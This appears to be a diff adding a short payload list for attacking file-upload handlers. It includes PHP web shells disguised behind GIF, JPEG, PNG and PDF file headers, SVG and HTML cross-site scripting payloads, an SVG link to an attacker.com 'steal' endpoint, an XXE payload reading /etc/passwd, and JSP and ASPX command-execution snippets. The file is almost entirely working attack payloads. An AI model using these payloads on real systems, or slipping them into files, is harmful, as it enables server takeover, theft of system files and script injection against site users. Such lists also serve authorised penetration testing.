@@ -1,0 +1,13 @@
+GIF89a;
+GIF89a;<?php system($_GET['cmd']); ?>
+\xFF\xD8\xFF\xE0<?php system($_GET['cmd']); ?>
+\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>
+%PDF-1.4<?php system($_GET['cmd']); ?>
+#define test_width 1
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="https://attacker.com/steal?c="></image></svg>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
+<html><body><script>alert(1)</script></body></html>
+<% Runtime.getRuntime().exec("id"); %>
+<%@ Page Language="C#" %><%Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c whoami"));%>
